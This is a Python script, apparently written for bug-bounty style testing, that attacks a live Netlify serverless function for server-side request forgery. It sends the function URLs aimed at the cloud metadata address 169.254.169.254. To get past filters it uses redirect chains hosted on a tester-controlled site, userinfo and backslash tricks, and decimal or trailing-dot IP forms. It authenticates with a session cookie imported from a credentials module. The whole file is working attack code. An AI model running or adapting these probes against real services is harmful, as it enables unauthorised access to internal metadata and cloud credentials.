# -*- coding: utf-8 -*-
# _bbh_ssrf2.py - redirect chain + obfuscation bypass attempts on bitbucket-self-hosted proxy
import sys, os, json, urllib.request, urllib.error

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _net_creds import COOKIE_B

FN = "https://app.netlify.com/.netlify/functions/bitbucket-self-hosted"
SB = "https://sec-b-08v4pk.netlify.app"

def req(method, url, cookie=None, body=None, timeout=35):
    r = urllib.request.Request(url, method=method)
    if cookie:
        r.add_header("Cookie", cookie)
    data = json.dumps(body).encode() if body is not None else None
    if body is not None:
        r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r, data=data, timeout=timeout) as resp:
            b = resp.read(120000)
            try:
                return resp.status, json.loads(b.decode("utf-8", "replace"))
            except Exception:
                return resp.status, b[:2000]
    except urllib.error.HTTPError as e:
        b = e.read(8000)
        try:
            return e.code, json.loads(b.decode("utf-8", "replace"))
        except Exception:
            return e.code, b[:800]
    except Exception as ex:
        return -1, str(ex)[:300]

def show(tag, s, d):
    if isinstance(d, bytes):
        d = d.decode("utf-8", "replace")
    if isinstance(d, str):
        print("%-44s -> %s %s" % (tag, s, d[:300]))
    else:
        print("%-44s -> %s %s" % (tag, s, json.dumps(d, ensure_ascii=False)[:300]))

def probe(tag, url, method="GET", payload=None, ck=COOKIE_B):
    body = {"url": url, "method": method, "token": "x", "payload": payload}
    s, d = req("POST", FN, cookie=ck, body=body)
    show(tag, s, d)

# 1) redirect chains on own site (hm_* rules live: 302 to absolute URLs)
probe("302->ctl (abs same-host)", SB + "/hm_ctl/x")
probe("302->meta (metadata)", SB + "/hm_meta/x")
probe("302->pub (api.netlify)", SB + "/hm_pub/x")
probe("302->r10", SB + "/hm_r10/x")
probe("302->nip", SB + "/hm_nip/x")
# 2) userinfo tricks
probe("userinfo @pub", "http://169.254.169.254@example.com/")
probe("userinfo @meta", "http://x@169.254.169.254/")
# 3) backslash / scheme confusion
probe("backslash meta", "http://169.254.169.254\\@example.com/")
probe("//@ meta", "http://example.com@169.254.169.254/")
# 4) redirect via http->https->meta using public redirector? none available
# 5) dots / brackets obfuscation of private ip
probe("meta trailing dot", "http://169.254.169.254./latest/meta-data/")
probe("meta plus", "http://169.254.169.254:80/latest/meta-data/")
probe("decimal with path", "http://2852039166/latest/meta-data/")
# 6) redirect chain to https private (metadata via https?)
probe("302->v6l", SB + "/hm_v6l/x")
probe("302->m100", SB + "/hm_m100/x")
